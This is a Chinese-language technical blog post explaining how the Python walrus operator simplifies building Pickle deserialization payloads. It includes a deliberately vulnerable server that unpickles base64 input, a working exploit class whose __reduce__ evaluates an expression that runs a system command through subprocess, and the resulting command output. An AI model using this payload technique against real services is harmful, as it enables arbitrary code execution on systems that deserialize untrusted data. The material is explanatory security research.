---
date: 2025-08-04T02:19:58+08:00
title: 利用海象运算符简化Python反序列化漏洞利用
tags: [Python安全, 反序列化漏洞, 海象运算符, 漏洞利用]
authors: qife
description: 本文介绍如何利用Python 3.8引入的海象运算符简化Pickle反序列化漏洞利用过程，通过表达式级变量赋值动态构造恶意对象，绕过传统漏洞利用中的限制条件。
---

# 利用海象运算符简化反序列化载荷构造

在利用Python反序列化（特别是Pickle）漏洞时，通常需要构造包含参数集合和服务器端可用可调用对象的载荷。最常见的方法是使用`eval`函数配合待执行的字符串，这种方案非常灵活——通常可以导入`os`模块并调用`os.system`执行任意命令。但某些场景下会存在限制，例如无法直接获取应用输出或出站连接被阻断导致反向Shell失效。有时甚至需要反序列化操作返回具有特定属性的对象。

传统方案若目标环境中存在现成类且攻击者了解其结构，可直接构造对应对象。否则将变得棘手，因为`eval`仅支持单表达式求值，而类声明属于语句而非表达式。Python 3.8引入的海象运算符（`:=`）完美解决了这个问题，它允许我们将赋值操作作为表达式的一部分。

核心思路是通过构造元组，使每个元素都能访问前序元素赋值的变量。例如以下合法Python表达式将求值为2：
```python
(a:=1, b:=a+a, b)[-1]
```

我们可以利用相同模式构造任意对象。假设存在如下服务端代码：
```python
#!/usr/bin/env python3
import base64
import pickle

class Item(object):
    def __init__(self, text):
        self.text = text
    def process(self):
        return self.text.upper().encode()

while True:
    try:
        b64data = input('Pickled object: ')
        data = base64.b64decode(b64data)
        item = pickle.loads(data)
        res = item.process()
        print(f'Result: {res.decode()}')
    except Exception as e:
        print(f'Error: {e}')
```

当无法通过stdout获取输出且禁止外连时，可通过以下方式构造满足要求的载荷（要求反序列化对象必须具有返回可解码字节串的`.process()`方法）：
```python
#!/usr/bin/env python3
import base64
import pickle

class Payload(object):
    def __reduce__(self):
        return eval, ('(a:=type("A", (object,), {}),b:=a(),b.__setattr__("process", lambda: __import__("subprocess").check_output("id")),b)[-1]',)

payload = base64.b64encode(pickle.dumps(Payload())).decode()
print(payload)
```

关键Python表达式解析：
```python
(
    a:=type("A", (object,), {}),  # 动态创建新类型A
    b:=a(),                       # 实例化A类型对象
    b.__setattr__("process",      # 动态添加process方法
        lambda: __import__("subprocess").check_output("id")
    ),
    b                             # 返回构造完成的对象
)[-1]
```

执行效果：
```
Pickled object: gASVlAAAA...（略）
Result: uid=1000(zetatwo) gid=1000(zetatwo) groups=1000(zetatwo)
```

该方法为Python反序列化漏洞利用提供了更灵活的载荷构造方式，特别适用于存在特殊约束条件的攻击场景。